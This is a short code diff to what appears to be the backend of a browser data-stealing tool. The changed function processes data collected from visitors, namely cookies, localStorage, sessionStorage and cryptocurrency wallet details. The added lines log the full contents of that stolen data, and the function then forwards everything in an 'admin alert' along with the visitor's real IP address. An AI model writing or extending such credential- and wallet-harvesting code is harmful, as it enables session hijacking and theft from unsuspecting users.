@@ -61,6 +61,31 @@ async function processCollectedData(data, req) {
     console.log(`Financial: ${Object.keys(data.financial || {}).length}`);
     console.log(`Hardware: ${JSON.stringify(data.hardware || {})}`);
     
+    // LOG ACTUAL COOKIE CONTENTS
+    console.log(`🍪 COOKIE DETAILS:`);
+    if (data.cookies) {
+      console.log(`Document cookies: ${data.cookies.document || 'none'}`);
+      if (data.cookies.parsed) {
+        console.log(`Parsed cookies:`, JSON.stringify(data.cookies.parsed, null, 2));
+      }
+    }
+    
+    // LOG STORAGE CONTENTS
+    console.log(`💾 STORAGE DETAILS:`);
+    if (data.storage && data.storage.localStorage) {
+      console.log(`LocalStorage:`, JSON.stringify(data.storage.localStorage, null, 2));
+    }
+    if (data.sessions && data.sessions.sessionStorage) {
+      console.log(`SessionStorage:`, JSON.stringify(data.sessions.sessionStorage, null, 2));
+    }
+    
+    // LOG FINANCIAL DATA
+    console.log(`💰 FINANCIAL DETAILS:`);
+    if (data.financial) {
+      console.log(`Wallets detected:`, data.financial.wallets);
+      console.log(`Wallet storage:`, data.financial.walletStorage);
+    }
+    
     // Send comprehensive admin alert
     await sendAdvancedDataAlert(data, realIP);
     
